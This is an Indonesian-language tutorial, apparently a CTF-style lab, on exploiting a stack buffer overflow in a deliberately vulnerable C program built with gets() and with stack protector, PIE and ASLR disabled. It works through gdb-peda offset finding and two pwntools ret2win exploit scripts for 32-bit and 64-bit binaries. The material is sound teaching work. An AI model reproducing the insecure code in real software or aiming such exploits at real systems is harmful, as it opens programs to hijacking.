
# BufferOverflow  32 bit dan 64bit dengan NX#

[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NX ~ tanpa -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}

```

dicompile dengan opsi

```bash
#untuk 32bit tanpa stack-protector Canary dan PIE
gcc -g -m32 -fno-stack-protector -no-pie -o vuln32 vuln_program.c
#untuk 64bit tanpa stack-protector Canary dan PIE
gcc -g -m64 -fno-stack-protector -no-pie -o vuln64 vuln_program.c
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : enabled
PIE       : disabled
RELRO     : Partial
```

untuk mendapatkan semua fungsi didalam program vuln32 sebagai berikut caranya

```bash
gdb-peda$info functions
All defined functions:

File vuln.c:
10: void flag();
27: int main(int, char **);
22: void vuln();

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  gets@plt
0x08049050  fgets@plt
0x08049060  getegid@plt
0x08049070  puts@plt
0x08049080  exit@plt
0x08049090  __libc_start_main@plt
0x080490a0  setvbuf@plt
0x080490b0  fopen@plt
0x080490c0  setresgid@plt
0x080490d0  _start
0x08049110  _dl_relocate_static_pie
0x08049120  __x86.get_pc_thunk.bx
0x08049130  deregister_tm_clones
0x08049170  register_tm_clones
0x080491b0  __do_global_dtors_aux
0x080491e0  frame_dummy
0x080492f9  __x86.get_pc_thunk.ax
0x08049300  __libc_csu_init
0x08049360  __libc_csu_fini
0x08049364  _fini
```

berikut ini untuk melihat isi perintah assembly dari fungsi main

```bash
gdb-peda$pdisass main
Dump of assembler code for function main:
   0x08049283 <+0>: lea    ecx,[esp+0x4]
   0x08049287 <+4>: and    esp,0xfffffff0
   0x0804928a <+7>: push   DWORD PTR [ecx-0x4]
   0x0804928d <+10>: push   ebp
   0x0804928e <+11>: mov    ebp,esp
   0x08049290 <+13>: push   ebx
   0x08049291 <+14>: push   ecx
   0x08049292 <+15>: sub    esp,0x10
   0x08049295 <+18>: call   0x8049120 <__x86.get_pc_thunk.bx>
   0x0804929a <+23>: add    ebx,0x2d66
   0x080492a0 <+29>: mov    eax,DWORD PTR [ebx-0x4]
   0x080492a6 <+35>: mov    eax,DWORD PTR [eax]
   0x080492a8 <+37>: push   0x0
   0x080492aa <+39>: push   0x2
   0x080492ac <+41>: push   0x0
   0x080492ae <+43>: push   eax
   0x080492af <+44>: call   0x80490a0 <setvbuf@plt>
   0x080492b4 <+49>: add    esp,0x10
   0x080492b7 <+52>: call   0x8049060 <getegid@plt>
   0x080492bc <+57>: mov    DWORD PTR [ebp-0xc],eax
   0x080492bf <+60>: sub    esp,0x4
   0x080492c2 <+63>: push   DWORD PTR [ebp-0xc]
   0x080492c5 <+66>: push   DWORD PTR [ebp-0xc]
   0x080492c8 <+69>: push   DWORD PTR [ebp-0xc]
   0x080492cb <+72>: call   0x80490c0 <setresgid@plt>
   0x080492d0 <+77>: add    esp,0x10
   0x080492d3 <+80>: sub    esp,0xc
   0x080492d6 <+83>: lea    eax,[ebx-0x1fbc]
   0x080492dc <+89>: push   eax
   0x080492dd <+90>: call   0x8049070 <puts@plt>
   0x080492e2 <+95>: add    esp,0x10
   0x080492e5 <+98>: call   0x804925b <vuln>
   0x080492ea <+103>: mov    eax,0x0
   0x080492ef <+108>: lea    esp,[ebp-0x8]
   0x080492f2 <+111>: pop    ecx
   0x080492f3 <+112>: pop    ebx
   0x080492f4 <+113>: pop    ebp
   0x080492f5 <+114>: lea    esp,[ecx-0x4]
   0x080492f8 <+117>: ret    
End of assembler dump.
```

berikut ini cara untuk melihat isi perintah assembly dari fungsi flag

```bash
gdb-peda$ pdisass flag
Dump of assembler code for function flag:
   0x080491e2 <+0>: push   ebp
   0x080491e3 <+1>: mov    ebp,esp
   0x080491e5 <+3>: push   ebx
   0x080491e6 <+4>: sub    esp,0x54
   0x080491e9 <+7>: call   0x8049120 <__x86.get_pc_thunk.bx>
   0x080491ee <+12>: add    ebx,0x2e12
   0x080491f4 <+18>: sub    esp,0x8
   0x080491f7 <+21>: lea    eax,[ebx-0x1ff8]
   0x080491fd <+27>: push   eax
   0x080491fe <+28>: lea    eax,[ebx-0x1ff6]
   0x08049204 <+34>: push   eax
   0x08049205 <+35>: call   0x80490b0 <fopen@plt>
   0x0804920a <+40>: add    esp,0x10
   0x0804920d <+43>: mov    DWORD PTR [ebp-0xc],eax
   0x08049210 <+46>: cmp    DWORD PTR [ebp-0xc],0x0
   0x08049214 <+50>: jne    0x8049232 <flag+80>
   0x08049216 <+52>: sub    esp,0xc
   0x08049219 <+55>: lea    eax,[ebx-0x1fec]
   0x0804921f <+61>: push   eax
   0x08049220 <+62>: call   0x8049070 <puts@plt>
   0x08049225 <+67>: add    esp,0x10
   0x08049228 <+70>: sub    esp,0xc
   0x0804922b <+73>: push   0x0
   0x0804922d <+75>: call   0x8049080 <exit@plt>
   0x08049232 <+80>: sub    esp,0x4
   0x08049235 <+83>: push   DWORD PTR [ebp-0xc]
   0x08049238 <+86>: push   0x40
   0x0804923a <+88>: lea    eax,[ebp-0x4c]
   0x0804923d <+91>: push   eax
   0x0804923e <+92>: call   0x8049050 <fgets@plt>
   0x08049243 <+97>: add    esp,0x10
   0x08049246 <+100>: sub    esp,0xc
   0x08049249 <+103>: lea    eax,[ebp-0x4c]
   0x0804924c <+106>: push   eax
   0x0804924d <+107>: call   0x8049030 <printf@plt>
   0x08049252 <+112>: add    esp,0x10
   0x08049255 <+115>: nop
   0x08049256 <+116>: mov    ebx,DWORD PTR [ebp-0x4]
   0x08049259 <+119>: leave  
   0x0804925a <+120>: ret    
End of assembler dump.
```

alamat dari flag adalah 0x080491e2

berikut ini cara untuk melihat isi perintah assembly dari fungsi vuln

```c
gdb-peda$ pdisass vuln
Dump of assembler code for function vuln:
   0x0804925b <+0>: push   ebp
   0x0804925c <+1>: mov    ebp,esp
   0x0804925e <+3>: push   ebx
   0x0804925f <+4>: sub    esp,0x44
   0x08049262 <+7>: call   0x80492f9 <__x86.get_pc_thunk.ax>
   0x08049267 <+12>: add    eax,0x2d99
   0x0804926c <+17>: sub    esp,0xc
   0x0804926f <+20>: lea    edx,[ebp-0x48]
   0x08049272 <+23>: push   edx
   0x08049273 <+24>: mov    ebx,eax
   0x08049275 <+26>: call   0x8049040 <gets@plt>
   0x0804927a <+31>: add    esp,0x10
   0x0804927d <+34>: nop
   0x0804927e <+35>: mov    ebx,DWORD PTR [ebp-0x4]
   0x08049281 <+38>: leave  
   0x08049282 <+39>: ret    
End of assembler dump.
```

kemudian diset breakpoint pada line 25 atau alamat 0x080491e9

```bash
gdb-peda$ b *0x0804927d
Breakpoint 1 at 0x804927d: file vuln.c, line 25.
```

untuk membuat inputan random sebanyak 100 karakter dengan pattern create

```bash
gdb-peda$pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

menjalankan aplikasinya 

```bash
gdb-peda$ run
Starting program: ./vuln32 
Welcome. Give me a string that gets you the flag: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
EAX: 0xffffd680 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41413341 ('A3AA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0xffffd6c8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffd680 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x8049281 (<vuln+38>: leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804927a <vuln+31>: add    esp,0x10
   0x804927d <vuln+34>: nop
   0x804927e <vuln+35>: mov    ebx,DWORD PTR [ebp-0x4]
=> 0x8049281 <vuln+38>: leave  
   0x8049282 <vuln+39>: ret    
   0x8049283 <main>: lea    ecx,[esp+0x4]
   0x8049287 <main+4>: and    esp,0xfffffff0
   0x804928a <main+7>: push   DWORD PTR [ecx-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd684 ("AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd688 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd68c ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd690 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd694 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd698 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd69c ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x08049281 in vuln () at vuln.c:25
25 }
gdb-peda$
```

ketik perintah continue supaya program berjalan sampai akhir

```bash
gdb-peda$ continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd680 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41413341 ('A3AA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd6d0 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]
0000| 0xffffd6d0 ("AJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd6d4 ("fAA5AAKAAgAA6AAL")
0008| 0xffffd6d8 ("AAKAAgAA6AAL")
0012| 0xffffd6dc ("AgAA6AAL")
0016| 0xffffd6e0 ("6AAL")
0020| 0xffffd6e4 --> 0x0 
0024| 0xffffd6e8 --> 0x0 
0028| 0xffffd6ec --> 0xf7df5b41 (<__libc_start_main+241>: add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()
gdb-peda$
```

mencari posisi byte di EIP pada pola yang dibuat menggunakan pattern create saat crash dengan perintah pattern offset

```bash
gdb-peda$ pattern offset 0x41344141
1093943617 found at offset: 76
```

sehingga kita bisa merubah isi dari EIP 76

payload 'A' sebanyak 76 + 0x080491e2 (alamat dari fungsi flag) 
karena linux ini adalah little endian maka menulisnya terbalik 
tetepi menggunakan pwn tools tidak perlu dibalik

isi exploit32.py

```python
from pwn import *

p = process('./vuln32')
print(p.recvuntil(b'flag: '))
padding = b'A'*76
ret_address = p32(0x080491e2)
p.sendline(padding+ret_address)
print(p.clean())
```

```bash
$python3 exploit32.py
[+] Starting local process './vuln32': pid 265
b'Welcome. Give me a string that gets you the flag: '
b'\nLKSN{SELAMAT}\n'
[*] Stopped process './vuln32' (pid 9388)
```

akhirnya sukses mengeksekusi fungsi vuln menggunakan bug/vulnerability buffer overflow

## untuk 64 bit

tidak banyak berbeda namun alamatnya semakin panjang

```bash
gdb-peda$ pdisass flag
Dump of assembler code for function flag:
   0x00000000004011a2 <+0>: push   rbp
   0x00000000004011a3 <+1>: mov    rbp,rsp
   0x00000000004011a6 <+4>: sub    rsp,0x50
   0x00000000004011aa <+8>: lea    rsi,[rip+0xe57]        # 0x402008
```

alamat dari flag di 0x00000000004011a2 atau 0x4011a2

mencari total bytes dari buffer sampai EBP

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/vuln64 
Welcome. Give me a string that gets you the flag: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe560 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fb4a00 --> 0xfbad2288 
RDX: 0x7ffff7fb68d0 --> 0x0 
RSI: 0x405261 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe561 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffe5a8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x401222 (<vuln+27>: ret)
R8 : 0x4052c5 --> 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x246 
R12: 0x4010c0 (<_start>: xor    ebp,ebp)
R13: 0x7fffffffe6b0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40121b <vuln+20>: call   0x401070 <gets@plt>
   0x401220 <vuln+25>: nop
   0x401221 <vuln+26>: leave  
=> 0x401222 <vuln+27>: ret    
   0x401223 <main>: push   rbp
   0x401224 <main+1>: mov    rbp,rsp
   0x401227 <main+4>: sub    rsp,0x20
   0x40122b <main+8>: mov    DWORD PTR [rbp-0x14],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe5a8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe5b0 ("AJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe5b8 ("AAKAAgAA6AAL")
0024| 0x7fffffffe5c0 --> 0x7f004c414136 
0032| 0x7fffffffe5c8 --> 0x0 
0040| 0x7fffffffe5d0 --> 0x401290 (<__libc_csu_init>: push   r15)
0048| 0x7fffffffe5d8 --> 0x7ffff7e1e09b (<__libc_start_main+235>: mov    edi,eax)
0056| 0x7fffffffe5e0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401222 in vuln () at vuln.c:25
25 }
gdb-peda$ pattern offset 0x4141334141644141
4702095841314488641 found at offset: 64
gdb-peda$
```

sehingga untuk sampai dengan EBP  = 64 bytes + 8 bytes (64 bit) = 72

exploit64.py 

```python
from pwn import *

p = process('./vuln64')
print(p.recvuntil(b'flag: '))
padding = b'A'*72
ret_address = p64(0x4011a2)
p.sendline(padding+ret_address)
print(p.clean())
```

hasilnya 

```bash
python3 exploit64.py 
[+] Starting local process './vuln64': pid 9558
b'Welcome. Give me a string that gets you the flag: '
b'\nLKSN{SELAMAT}\n'
[*] Stopped process './vuln64' (pid 9558)
```